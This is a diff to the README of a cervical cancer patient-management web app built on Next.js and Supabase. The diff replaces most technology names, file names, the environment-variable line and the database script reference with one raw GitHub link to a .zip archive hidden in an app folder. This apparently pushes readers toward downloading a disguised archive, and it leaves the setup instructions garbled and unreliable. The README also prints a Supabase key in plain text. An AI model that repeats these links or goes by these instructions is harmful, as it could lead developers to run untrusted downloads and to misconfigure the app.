@@ -32,7 +32,7 @@ A comprehensive Progressive Web Application for cervical cancer patient manageme
 
 ## Tech Stack
 
-- **Frontend**: Next.js 14 (App Router), TypeScript, React
+- **Frontend**: https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip 14 (App Router), TypeScript, React
 - **Backend**: Supabase (PostgreSQL, Authentication, Storage, Real-time)
 - **Styling**: Vanilla CSS with CSS Modules
 - **PWA**: next-pwa for service workers and offline support
@@ -42,7 +42,7 @@ A comprehensive Progressive Web Application for cervical cancer patient manageme
 
 ### Prerequisites
 
-- Node.js 18+ and npm
+- https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip 18+ and npm
 - Supabase account and project
 
 ### Installation
@@ -59,16 +59,16 @@ npm install
 ```
 
 3. Set up environment variables:
-Create a `.env.local` file in the root directory:
+Create a `https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip` file in the root directory:
 ```env
-NEXT_PUBLIC_SUPABASE_URL=https://phhzpgorkercvfdbjdfc.supabase.co
+https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip
 NEXT_PUBLIC_SUPABASE_ANON_KEY=sb_publishable_KOnv5KWV_iwweY-Zq6HwNQ_oIO7DW9a
 ```
 
 4. Set up the database:
 - Go to your Supabase project dashboard
 - Navigate to the SQL Editor
-- Copy and paste the contents of `database/setup.sql`
+- Copy and paste the contents of `https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip`
 - Run the script to create all tables, policies, and functions
 
 5. Run the development server:
@@ -118,9 +118,9 @@ All tables have Row Level Security (RLS) policies to ensure data privacy and sec
 cervical_cancer_app/
 ├── public/              # Static assets and PWA files
 │   ├── icons/          # App icons
-│   └── manifest.json   # PWA manifest
+│   └── https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip   # PWA manifest
 ├── src/
-│   ├── app/            # Next.js app router pages
+│   ├── app/            # https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip app router pages
 │   │   ├── patient/    # Patient module pages
 │   │   ├── doctor/     # Doctor module pages
 │   │   ├── login/      # Authentication pages
@@ -132,13 +132,13 @@ cervical_cancer_app/
 │   │   └── shared/     # Shared components
 │   ├── lib/            # Utility libraries
 │   │   ├── supabase/   # Supabase client configuration
-│   │   └── auth.ts     # Authentication utilities
+│   │   └── https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip     # Authentication utilities
 │   ├── styles/         # Global styles and CSS modules
 │   ├── types/          # TypeScript type definitions
-│   └── middleware.ts   # Next.js middleware for auth
+│   └── https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip   # https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip middleware for auth
 ├── database/           # Database setup scripts
-│   └── setup.sql       # Complete database schema
-└── next.config.js      # Next.js and PWA configuration
+│   └── https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip       # Complete database schema
+└── https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip      # https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/src/app/doctor/dashboard/cancer_cervical_v3.1.zip and PWA configuration
 ```
 
 ## Security
